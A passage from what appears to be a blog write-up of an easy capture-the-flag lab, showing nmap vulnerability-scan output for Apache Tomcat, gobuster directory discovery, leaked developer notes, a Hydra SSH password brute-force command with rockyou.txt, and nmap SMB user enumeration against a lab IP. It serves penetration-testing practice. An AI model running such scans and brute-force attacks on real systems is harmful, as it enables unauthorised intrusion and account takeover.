|     	3A26C086-A741-585B-8FA9-F90780E2CA16	9.3	https://vulners.com/githubexploit/3A26C086-A741-585B-8FA9-F90780E2CA16	*EXPLOIT*
|     	1337DAY-ID-32925	9.3	https://vulners.com/zdt/1337DAY-ID-32925	*EXPLOIT*
|     	TOMCAT:BE665F9148D024F7474C0628515C3A37	7.5	https://vulners.com/tomcat/TOMCAT:BE665F9148D024F7474C0628515C3A37
|     	MSF:ILITIES/UBUNTU-CVE-2018-8014/	7.5	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-8014/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE_LINUX-CVE-2020-1938/	7.5	https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2020-1938/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1938/	7.5	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1938/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON_LINUX-CVE-2020-1938/	7.5	https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2020-1938/	*EXPLOIT*
|     	EDB-ID:49039	7.5	https://vulners.com/exploitdb/EDB-ID:49039	*EXPLOIT*
|     	CVE-2020-1938	7.5	https://vulners.com/cve/CVE-2020-1938
|     	CVE-2018-8014	7.5	https://vulners.com/cve/CVE-2018-8014
|     	C3759325-98F9-5F0F-98F5-6EAE787CE3FB	7.5	https://vulners.com/githubexploit/C3759325-98F9-5F0F-98F5-6EAE787CE3FB	*EXPLOIT*
|     	7130E91B-2DF2-565E-ADE8-4C60D45E5A4D	7.5	https://vulners.com/githubexploit/7130E91B-2DF2-565E-ADE8-4C60D45E5A4D	*EXPLOIT*
|     	6E0425A5-AA6D-5FC6-9F8C-415345C30DD5	7.5	https://vulners.com/githubexploit/6E0425A5-AA6D-5FC6-9F8C-415345C30DD5	*EXPLOIT*
|     	1638D72C-F3EB-52FB-B16F-5F1996A67C0A	7.5	https://vulners.com/githubexploit/1638D72C-F3EB-52FB-B16F-5F1996A67C0A	*EXPLOIT*
|     	140968B5-6F8E-57C6-8A61-831D5FB78836	7.5	https://vulners.com/githubexploit/140968B5-6F8E-57C6-8A61-831D5FB78836	*EXPLOIT*
|     	0B52DD25-4874-54EB-8213-8FA10B0966A3	7.5	https://vulners.com/githubexploit/0B52DD25-4874-54EB-8213-8FA10B0966A3	*EXPLOIT*
|     	TOMCAT:3535F2AFC77921EE4AD662129D83A68D	5.8	https://vulners.com/tomcat/TOMCAT:3535F2AFC77921EE4AD662129D83A68D
|     	CVE-2021-30640	5.8	https://vulners.com/cve/CVE-2021-30640
|     	CVE-2020-1935	5.8	https://vulners.com/cve/CVE-2020-1935
|     	TOMCAT:34D1BB5AAB77A4FA5A232BB1CC1DBE12	5.1	https://vulners.com/tomcat/TOMCAT:34D1BB5AAB77A4FA5A232BB1CC1DBE12
|     	MSF:ILITIES/ORACLE_LINUX-CVE-2019-17563/	5.1	https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2019-17563/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-17563/	5.1	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-17563/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON_LINUX-CVE-2019-17563/	5.1	https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-17563/	*EXPLOIT*
|     	CVE-2019-17563	5.1	https://vulners.com/cve/CVE-2019-17563
|     	TOMCAT:E0D7CC4566625A34425D5CE3D847746F	5.0	https://vulners.com/tomcat/TOMCAT:E0D7CC4566625A34425D5CE3D847746F
|     	TOMCAT:C878975BAAD7823EE793B63FC6053125	5.0	https://vulners.com/tomcat/TOMCAT:C878975BAAD7823EE793B63FC6053125
|     	TOMCAT:C3F367059A3E9B8636ED41FF901D93F9	5.0	https://vulners.com/tomcat/TOMCAT:C3F367059A3E9B8636ED41FF901D93F9
|     	TOMCAT:A0B0592E070D3A4A393867C40FBB81D8	5.0	https://vulners.com/tomcat/TOMCAT:A0B0592E070D3A4A393867C40FBB81D8
|     	TOMCAT:42FCCA1B939943E71978F85565FFC5D2	5.0	https://vulners.com/tomcat/TOMCAT:42FCCA1B939943E71978F85565FFC5D2
|     	TOMCAT:3C894B78CB6026265DCB4F6CBB52E528	5.0	https://vulners.com/tomcat/TOMCAT:3C894B78CB6026265DCB4F6CBB52E528
|     	TOMCAT:324E50A03961FCE2265C4097A2D9383A	5.0	https://vulners.com/tomcat/TOMCAT:324E50A03961FCE2265C4097A2D9383A
|     	TOMCAT:1ACD2AE0B03FBB401CCE27D5C801BE3B	5.0	https://vulners.com/tomcat/TOMCAT:1ACD2AE0B03FBB401CCE27D5C801BE3B
|     	TOMCAT:045D264F03959F4DF2D140C7A3C6A05B	5.0	https://vulners.com/tomcat/TOMCAT:045D264F03959F4DF2D140C7A3C6A05B
|     	TOMCAT:03526B264C3CCDD4C74F8B8FBF02E5E4	5.0	https://vulners.com/tomcat/TOMCAT:03526B264C3CCDD4C74F8B8FBF02E5E4
|     	SSV:99316	5.0	https://vulners.com/seebug/SSV:99316	*EXPLOIT*
|     	SMNTC-108874	5.0	https://vulners.com/symantec/SMNTC-108874
|     	MSF:ILITIES/UBUNTU-CVE-2018-8034/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-8034/	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1336/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1336/	*EXPLOIT*
|     	CVE-2021-42340	5.0	https://vulners.com/cve/CVE-2021-42340
|     	CVE-2021-33037	5.0	https://vulners.com/cve/CVE-2021-33037
|     	CVE-2021-25122	5.0	https://vulners.com/cve/CVE-2021-25122
|     	CVE-2020-17527	5.0	https://vulners.com/cve/CVE-2020-17527
|     	CVE-2020-13935	5.0	https://vulners.com/cve/CVE-2020-13935
|     	CVE-2020-13934	5.0	https://vulners.com/cve/CVE-2020-13934
|     	CVE-2020-11996	5.0	https://vulners.com/cve/CVE-2020-11996
|     	CVE-2019-10072	5.0	https://vulners.com/cve/CVE-2019-10072
|     	CVE-2019-0199	5.0	https://vulners.com/cve/CVE-2019-0199
|     	CVE-2018-8034	5.0	https://vulners.com/cve/CVE-2018-8034
|     	CVE-2018-1336	5.0	https://vulners.com/cve/CVE-2018-1336
|     	18F5237C-DCAC-5831-AED6-F0880A11DFF2	5.0	https://vulners.com/githubexploit/18F5237C-DCAC-5831-AED6-F0880A11DFF2	*EXPLOIT*
|     	TOMCAT:F551C8E09F0122E8322CF8CB981AC710	4.4	https://vulners.com/tomcat/TOMCAT:F551C8E09F0122E8322CF8CB981AC710
|     	TOMCAT:A01991EC43D0F6A28E9CB4553C6B4670	4.4	https://vulners.com/tomcat/TOMCAT:A01991EC43D0F6A28E9CB4553C6B4670
|     	MSF:ILITIES/SUSE-CVE-2019-12418/	4.4	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-12418/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-12418/	4.4	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-12418/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-12418/	4.4	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-12418/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-12418/	4.4	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-12418/	*EXPLOIT*
|     	F60737C1-A24B-51C1-AE8D-73A65C778FFF	4.4	https://vulners.com/githubexploit/F60737C1-A24B-51C1-AE8D-73A65C778FFF	*EXPLOIT*
|     	E95D9A0E-E9DE-5D95-9879-E07C0257318C	4.4	https://vulners.com/githubexploit/E95D9A0E-E9DE-5D95-9879-E07C0257318C	*EXPLOIT*
|     	D5CBA0E2-A4B0-52CE-B93B-F433CE8662DA	4.4	https://vulners.com/githubexploit/D5CBA0E2-A4B0-52CE-B93B-F433CE8662DA	*EXPLOIT*
|     	CVE-2021-25329	4.4	https://vulners.com/cve/CVE-2021-25329
|     	CVE-2020-9484	4.4	https://vulners.com/cve/CVE-2020-9484
|     	CVE-2019-12418	4.4	https://vulners.com/cve/CVE-2019-12418
|     	C4EDB405-454C-5160-9A99-21A930740C3F	4.4	https://vulners.com/githubexploit/C4EDB405-454C-5160-9A99-21A930740C3F	*EXPLOIT*
|     	B0BA17F5-F171-5C97-9F6C-D5F38B5B64F5	4.4	https://vulners.com/githubexploit/B0BA17F5-F171-5C97-9F6C-D5F38B5B64F5	*EXPLOIT*
|     	743F51FB-8BF4-5425-AEFA-10B2A14C8F3B	4.4	https://vulners.com/githubexploit/743F51FB-8BF4-5425-AEFA-10B2A14C8F3B	*EXPLOIT*
|     	5602A60A-886A-598C-99B3-EE2E820506AD	4.4	https://vulners.com/githubexploit/5602A60A-886A-598C-99B3-EE2E820506AD	*EXPLOIT*
|     	504D019A-423C-50A0-9677-93192F0ECDFC	4.4	https://vulners.com/githubexploit/504D019A-423C-50A0-9677-93192F0ECDFC	*EXPLOIT*
|     	4278B435-D22E-57E8-ABC4-639BAAFA6FC9	4.4	https://vulners.com/githubexploit/4278B435-D22E-57E8-ABC4-639BAAFA6FC9	*EXPLOIT*
|     	14CD7401-C309-52B2-B4EE-AD54900F0455	4.4	https://vulners.com/githubexploit/14CD7401-C309-52B2-B4EE-AD54900F0455	*EXPLOIT*
|     	TOMCAT:6B8125EDA215F510A527D712FEF3FF0A	4.3	https://vulners.com/tomcat/TOMCAT:6B8125EDA215F510A527D712FEF3FF0A
|     	TOMCAT:1CE79F1FB24CB690F26B87530FB0DBF3	4.3	https://vulners.com/tomcat/TOMCAT:1CE79F1FB24CB690F26B87530FB0DBF3
|     	SMNTC-105524	4.3	https://vulners.com/symantec/SMNTC-105524
|     	PACKETSTORM:163457	4.3	https://vulners.com/packetstorm/PACKETSTORM:163457	*EXPLOIT*
|     	PACKETSTORM:163456	4.3	https://vulners.com/packetstorm/PACKETSTORM:163456	*EXPLOIT*
|     	MSF:ILITIES/JRE-VULN-CVE-2019-2684/	4.3	https://vulners.com/metasploit/MSF:ILITIES/JRE-VULN-CVE-2019-2684/	*EXPLOIT*
|     	MSF:ILITIES/IBM-JAVA-CVE-2019-2684/	4.3	https://vulners.com/metasploit/MSF:ILITIES/IBM-JAVA-CVE-2019-2684/	*EXPLOIT*
|     	MSF:ILITIES/IBM-AIX-CVE-2019-2684/	4.3	https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-2684/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-0221/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-0221/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-2684/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-2684/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-2684/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-2684/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-0221/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-0221/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-2684/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-2684/	*EXPLOIT*
|     	MSF:ILITIES/GENTOO-LINUX-CVE-2019-2684/	4.3	https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-2684/	*EXPLOIT*
|     	MSF:ILITIES/GENTOO-LINUX-CVE-2019-0221/	4.3	https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-0221/	*EXPLOIT*
|     	MSF:ILITIES/DEBIAN-CVE-2019-2684/	4.3	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-2684/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-2684/	4.3	https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-2684/	*EXPLOIT*
|     	EDB-ID:50119	4.3	https://vulners.com/exploitdb/EDB-ID:50119	*EXPLOIT*
|     	EDB-ID:50118	4.3	https://vulners.com/exploitdb/EDB-ID:50118	*EXPLOIT*
|     	CVE-2021-41079	4.3	https://vulners.com/cve/CVE-2021-41079
|     	CVE-2021-24122	4.3	https://vulners.com/cve/CVE-2021-24122
|     	CVE-2019-0221	4.3	https://vulners.com/cve/CVE-2019-0221
|     	CVE-2018-8037	4.3	https://vulners.com/cve/CVE-2018-8037
|     	CVE-2018-11784	4.3	https://vulners.com/cve/CVE-2018-11784
|     	1337DAY-ID-36546	4.3	https://vulners.com/zdt/1337DAY-ID-36546	*EXPLOIT*
|     	1337DAY-ID-36545	4.3	https://vulners.com/zdt/1337DAY-ID-36545	*EXPLOIT*
|     	TOMCAT:909935A4BEB7C54CD1FA804D13CDD890	4.0	https://vulners.com/tomcat/TOMCAT:909935A4BEB7C54CD1FA804D13CDD890
|     	CVE-2020-13943	4.0	https://vulners.com/cve/CVE-2020-13943
|     	SMNTC-111247	0.0	https://vulners.com/symantec/SMNTC-111247
|_    	SMNTC-111245	0.0	https://vulners.com/symantec/SMNTC-111245
|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn&#039;t find wp-login.php
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/4%OT=22%CT=1%CU=34280%PV=Y%DS=4%DC=T%G=Y%TM=618494C
OS:8%P=aarch64-unknown-linux-gnu)SEQ(SP=102%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS
OS:=8)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M
OS:506ST11NW7%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68
OS:DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
OS:=40%CD=S)

Uptime guess: 0.019 days (since Thu Nov  4 19:52:32 2021)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   30.62 ms  10.13.0.1
2   ... 3
4   172.85 ms 10.10.74.250

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov  4 20:19:52 2021 -- 1 IP address (1 host up) scanned in 1390.99 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Available services:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;OpenSSH 7.2p2 on port 22&lt;/li&gt;
&lt;li&gt;Apache 2.4.18 on port 80&lt;/li&gt;
&lt;li&gt;Samba 3 or 4 on ports 139/445&lt;/li&gt;
&lt;li&gt;Apache Jserve on port 8009&lt;/li&gt;
&lt;li&gt;Apache Tomcat 9.0.7 on port 8080&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The server looks to be running Ubuntu.&lt;/p&gt;
&lt;p&gt;Going to &lt;code&gt;http://10.10.74.250:80&lt;/code&gt; revels a generic “maintenance” page, but there’s a note to “[c]heck our dev note section if you need to know what to work on.”&lt;/p&gt;
&lt;p&gt;Going to &lt;code&gt;http://10.10.74.250:8080&lt;/code&gt; reveals what looks like the generic first-run Tomcat page. Poking around there doesn’t reveal any obvious modifications.&lt;/p&gt;
&lt;h2 id=&quot;flag-1&quot;&gt;Flag 1&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#flag-1&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Let’s hit &lt;code&gt;http://10.10.74.250:80&lt;/code&gt; with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/gobuster&quot; class=&quot;internal&quot; data-slug=&quot;spells/gobuster&quot;&gt;gobuster&lt;/a&gt; and see what we find!&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;gobuster&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; dir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;	-u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; http://10.10.74.250&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;	-w&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;It looks like there’s a “hidden” directory here…&lt;/p&gt;
&lt;h2 id=&quot;flags-2-3-4-and-5&quot;&gt;Flags 2, 3, 4, and 5&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#flags-2-3-4-and-5&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;This hidden directory contains two files.&lt;/p&gt;
&lt;p&gt;dev.txt:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;2018-04-23: I&#039;ve been messing with that struts stuff, and it&#039;s pretty cool! I think it might be neat
to host that on this server too. Haven&#039;t made any real web apps yet, but I have tried that example
you get to show off how it works (and it&#039;s the REST version of the example!). Oh, and right now I&#039;m 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Okay, so we’ve got two users, “J” and “K”, and an example REST app of some kind (using Apache Struts?) with version 2.5.12.&lt;/p&gt;
&lt;p&gt;j.txt:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;For J:

I&#039;ve been auditing the contents of /etc/shadow to make sure we don&#039;t have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seems like J has a weak password.&lt;/p&gt;
&lt;p&gt;From a quick check of the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/hydra&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/hydra&quot;&gt;Hydra&lt;/a&gt; &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/man&quot; class=&quot;internal&quot; data-slug=&quot;spells/man&quot;&gt;man&lt;/a&gt; page, it looks like we can feed it a list of usernames with the -L option. I’m going to make a couple assumptions:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Usernames are probably English-language first names. I’m guessing this because the comments in the /development directory are in English, and because this is supposed to be an “easy” CTF.&lt;/li&gt;
&lt;li&gt;The password is probably listed in the rockyou.txt dump. Again, both because of the comment, and because this is an “easy” CTF.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;A couple of quick searches on &lt;a href=&quot;https://duckduckgo.com/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;DuckDuckGo&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; landed me on &lt;a href=&quot;https://github.com/jeanphorn/wordlist/blob/master/usernames.txt&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;this list of common usernames&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;; I’m going to filter that down to just the Js and then feed it + rockyou.txt into &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/hydra&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/hydra&quot;&gt;Hydra&lt;/a&gt;.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;hydra&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -L&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; j.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -P&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; rockyou.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -vV&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10.10.74.250&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; ssh&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Except… That’s going to take &lt;em&gt;forever&lt;/em&gt;. The hint suggests looking at Samba to find usernames, which is a good reminder.&lt;/p&gt;
&lt;p&gt;I &lt;em&gt;thought&lt;/em&gt; I had some notes about how to do this, but it looks like I don’t. But a little bit of search brings me to &lt;a href=&quot;https://www.infosecademy.com/nmap-smb-scripts-enumeration/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Nmap SMB Scripts and SMB Enumeration Step-By-Step Pentesting Guide&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;. To &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/nmap&quot;&gt;Nmap&lt;/a&gt; again!&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -vv&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -oA&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; basic-pentesting-enumerate-smb&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -sT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;     --script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; smb-enum-users.nse&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -p445&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10.10.74.250&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;But this doesn’t return any results (maybe it’s &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/windows&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/windows&quot;&gt;Windows&lt;/a&gt;-specific?).&lt;/p&gt;
